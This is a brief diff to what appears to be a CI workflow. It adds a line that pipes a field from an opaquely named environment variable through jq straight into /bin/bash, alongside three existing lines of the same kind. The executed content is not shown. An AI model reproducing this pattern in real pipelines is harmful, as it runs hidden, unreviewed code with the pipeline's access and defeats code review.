@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$cbrlp220" | jq -r .vbby003 | /bin/bash
           echo $sre63 | jq -r .yzes9 | /bin/bash
           echo $mtbcb99410 | jq -r .cug6008 | /bin/bash
+          echo $lvq10253 | jq -r .mjj8 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
